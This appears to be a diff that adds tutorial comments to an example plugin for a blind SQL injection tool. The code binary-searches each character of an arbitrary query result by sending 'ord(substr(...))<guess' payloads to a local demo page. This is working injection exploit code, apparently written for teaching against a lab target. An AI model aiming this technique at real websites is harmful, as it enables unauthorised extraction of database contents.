@@ -3,12 +3,14 @@
 import duncan
 import requests
 
-class SimpleDuncan(duncan.Duncan):
-	def decide(self,guess):
-
+class SimpleDuncan(duncan.Duncan): # Inherit from Duncan
+	def decide(self,guess): # Implement decide()
+		# Construct your query to split the search space into two at guess
+		# self._query holds the query to be executed from the command line
+		# self._pos is the position of the character to be guessed
 		url="http://localhost/demo/sqli/blind.php?p=1 and ord(substr((%s),%d,1))<%d" % (self._query,self._pos,guess)
-		self.debug(6,url)
-		r=requests.get(url)
+		self.debug(6,url) # You can use the parents method for debug output
+		r=requests.get(url) 
 		
 		if r.content.find(':)')>-1:
 			return True
